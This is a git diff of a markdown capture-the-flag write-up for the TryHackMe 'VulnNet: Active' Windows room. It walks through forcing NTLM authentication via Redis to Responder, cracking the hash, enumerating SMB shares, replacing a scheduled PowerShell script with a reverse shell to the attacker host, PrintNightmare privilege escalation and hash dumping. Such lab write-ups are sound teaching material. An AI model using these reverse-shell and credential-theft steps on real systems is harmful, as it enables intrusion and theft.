@@ -9,7 +9,9 @@ The room focuses on attacking a Windows Active Directory machine, starting from 
 **TryHackMe Room**: [VulnNet: Active](https://tryhackme.com/room/vulnnetactive)
 
 ## Enumeration 
+
 Starting with the nmap scan . 
+
 ```
 sudo nmap -p 1-10000 -Pn -sC -sV -O 10.48.191.231
 
@@ -50,13 +52,15 @@ Among the discovered services, **Redis running on port 6379** stood out as unusu
 
 Because Redis commonly does **not require authentication** by default, so we can abuse Redis to to authenticate to an attacker controlled SMB share, allowing Responder to capture NTLM credentials.
 
- Start by running responder 
+Start by running responder 
+
 ```
 sudo responder -I tun0 -dwv
 ```
 
 First establish a connection to the  running on the target system. Then change the Redis working directory to a UNC network path hosted on the attacker machine. It forces the window target to access the remote SMB share and automatically send NTLM authentication credentials. 
 the file name (fake.txt) is arbitrary and does not need to exist.
+
 ```
 redis-cli -h 10.48.191.231
   
@@ -70,16 +74,21 @@ Save
 In Responder, the NTLM hash is captured.
 
 ![](/assets/image/ntlm.png)
-save the NTLM hash to a file and crack it . I will be using hascat for this instance.
+
+Save the NTLM hash to a file and crack it . I will be using hascat for this instance.
+
 ```
 hashcat -m 5600 vulnet.txt /usr/share/wordlists/rockyou.txt -O
 
 password: sand_0873959498
 ```
 ![hascat](/assets/image/hashcat.png)
+
 ## Enumerate shares
+
 Now that we have valid credentials , we can further enumerate to gather additional information.
 Using enum4linux to enumerate users, groups, shares, and other domain-related information. 
+
 ```
 enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.49.146.193
 
@@ -88,7 +97,7 @@ enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.49.146.193
 ![enumerating shares](/assets/image/shares.png)
 
 The results showed several default administrative and domain-related shares, along with a custom share named **Enterprise-Share** and it is accessible with our low privileged user . 
-The next step is to list the contents of the share with smbclient .  I only discovered one file here named  PurgeIrrelevantData_1826.ps1 . 
+The next step is to list the contents of the share with smbclient . I only discovered one file here named  PurgeIrrelevantData_1826.ps1 . 
 
 ```
 smbclient //10.49.146.193/Enterprise-Share -U 'enterprise-security'
@@ -105,6 +114,7 @@ rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
 
 Assuming that the script can be modified using the low privilege we can change the content of the file to get a reverse shell . I will be using a powershell reverse shell script . It will establish **reverse TCP shell** from the target machine back to the attacker.
+
 ```
 #rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue  
 $LHOST = "192.168.145.147"; $LPORT = 4444;   
@@ -123,11 +133,13 @@ $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 ```
 
 Starting listener .
+
 ```
 nc -lvnp 4444
 ```
 
 Upload the file again and it will replace the .ps1 with the one uploaded .
+
 ```
 put PurgeIrrelevantData_1826.ps1
 ```
@@ -137,6 +149,7 @@ Soon we will get the connection and navigate to  C:\Users\enterprise-security\De
 ![user flag](/assets/image/user.png)
 
 ## Privilege Escalation 
+
 Since the target is a **Windows machine**, the **Print Spooler service** is  considered as a potential attack vector and One well-known vulnerability affecting this service is **PrintNightmare**.
 
 **PrintNightmare** is a critical vulnerability in the **Windows Print Spooler service** that allows **remote code execution (RCE)** and **local privilege escalation (LPE)**. When the Print Spooler service is enabled on a vulnerable system, a low-privileged user can abuse this flaw to execute arbitrary code with **SYSTEM-level privileges**.
@@ -158,9 +171,11 @@ Invoke-Nightmare
 ```
 
 ![](/assets/image/invoke.png)
+
 This adds user `adm1n`/`P@ssw0rd` in the local admin group by default. 
 
 ## Post Exploitation 
+
 After successfully escalating privileges and obtaining administrative access, using Impacket’s `secretsdump.py `,  I can dump the  **NTLM password hashes** for local and domain accounts . 
 
 ![dumping hashes](/assets/image/secretsdump.png)
